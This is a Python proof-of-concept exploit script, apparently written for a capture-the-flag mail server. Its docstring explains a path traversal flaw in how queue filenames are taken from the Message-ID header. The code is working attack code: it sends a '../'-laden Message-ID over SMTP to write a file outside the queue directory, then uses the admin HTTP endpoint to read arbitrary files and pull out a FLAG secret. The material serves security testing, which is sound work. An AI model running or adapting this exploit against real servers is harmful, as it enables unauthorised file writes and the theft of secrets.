#!/usr/bin/env python3
"""
PoC #7: Path traversal in the on-disk queue filename -> runtime flag disclosure
--------------------------------------------------------------------------------
Location: queue.deriveFilename() + queue.queueFilePath() in src/queue.js.
deriveFilename() takes the queue filename straight from the client-supplied
Message-ID header (RFC 5322 §3.6.4), stripping only its angle brackets - no
rejection of "..", "/", or an absolute path. queueFilePath() then does a
naive path.join(QUEUE_DIR, 'new', name) with no path.resolve()+prefix
containment check. The SAME naive join is reused by the admin HTTP read-back
endpoint (admin.js `GET /queue/:name`), so this escapes MTA_QUEUE_DIR both
ways: an arbitrary on-disk WRITE via the SMTP Message-ID header, and an
arbitrary on-disk READ via the admin API's GET /queue/<name> - which needs
no prior SMTP write of its own to reach a file that already exists.

This PoC demonstrates both, purely over the network:

  1. WRITE (against a throwaway path): send a message over SMTP whose
     Message-ID traverses out of <queue>/new/ into /tmp, containing a unique
     proof string, then read that exact path back through the admin HTTP API
     (a different protocol than the SMTP write) - showing the file really
     landed outside the intended queue directory, on disk, via SMTP alone.

  2. READ (against the real runtime secret): GET /queue/<traversal to
     MTA_SECRET> directly - no SMTP write needed, since the flag file
     already exists on disk (written by entrypoint.sh at container start
     from MTA_FLAG, generated per-deployment by ../generate-secrets.sh) -
     and confirm the response contains this deployment's actual FLAG{...}
     value, not a value checked into the repo.

Run: python3 07_queue_path_traversal.py [host] [port] [admin_port] [secret_path]
     (secret_path defaults to "home/ctf/mta/secret/flag.txt", matching the
     Dockerfile's MTA_SECRET; override if a deployment's layout differs)
"""
import http.client
import re
import socket
import sys
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2525
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
SECRET_PATH = sys.argv[4] if len(sys.argv) > 4 else "home/ctf/mta/secret/flag.txt"

# Generous number of "../" - path.join()'s normalization clamps at "/" once
# exhausted, so any number at or above the true depth lands in the same
# place; we don't need to know QUEUE_DIR's exact depth.
TRAVERSAL = "../" * 10


def read_reply(sock):
    sock.settimeout(5)
    return sock.recv(4096).decode(errors="replace")


def cmd(sock, line):
    sock.sendall((line + "\r\n").encode())
    return read_reply(sock)


def admin_get(path):
    conn = http.client.HTTPConnection(HOST, ADMIN_PORT, timeout=10)
    conn.request("GET", path)
    resp = conn.getresponse()
    body = resp.read().decode(errors="replace")
    conn.close()
    return resp.status, body


def demonstrate_write():
    """Arbitrary WRITE, proven against a throwaway /tmp path."""
    token = uuid.uuid4().hex[:10]
    proof = f"TRAVERSAL_PROOF_{token}"
    traversal_name = f"{TRAVERSAL}tmp/mta_poc_{token}.eml"

    sock = socket.create_connection((HOST, PORT), timeout=10)
    read_reply(sock)
    cmd(sock, "EHLO poc.example")
    cmd(sock, "MAIL FROM:<a@b.example>")
    cmd(sock, "RCPT TO:<x@y.example>")
    r = cmd(sock, "DATA")
    if not r.startswith("354"):
        print(f"[-] DATA rejected: {r.strip()}")
        return False

    message = (
        f"Message-ID: <{traversal_name}>\r\n"
        f"Subject: path traversal poc (write)\r\n"
        f"\r\n"
        f"{proof}\r\n"
        f"."
    )
    r = cmd(sock, message)
    sock.close()
    if "queued as" not in r:
        print(f"[-] Message was not queued: {r.strip()}")
        return False

    status, body = admin_get(f"/queue/{traversal_name}")
    print(f"[*] WRITE check: GET /queue/{traversal_name} -> {status}")
    if status == 200 and proof in body:
        print(f"[+] Confirmed arbitrary WRITE: the Message-ID-derived filename escaped the intended "
              f"queue directory and wrote to /tmp - proof string '{proof}' read back purely over "
              f"HTTP, with no direct filesystem access from this script")
        return True

    print("[-] Could not read the traversal-written file back - write-side traversal may be blocked")
    return False


def demonstrate_flag_read():
    """Arbitrary READ, against the real runtime secret - no prior SMTP write."""
    traversal_name = f"{TRAVERSAL}{SECRET_PATH}"
    status, body = admin_get(f"/queue/{traversal_name}")
    print(f"[*] READ check: GET /queue/{traversal_name} -> {status}")

    m = re.search(r"FLAG\{[^}]*\}", body)
    if status == 200 and m:
        print(f"[+] Confirmed arbitrary READ: escaped MTA_QUEUE_DIR to read the runtime secret "
              f"outside it, over the admin HTTP API alone - disclosed {m.group(0)}")
        return True

    print("[-] Did not disclose the flag (read-side traversal may be blocked, or MTA_SECRET moved)")
    return False


def main():
    write_ok = demonstrate_write()
    read_ok = demonstrate_flag_read()
    return 0 if (write_ok and read_ok) else 1


if __name__ == "__main__":
    sys.exit(main())
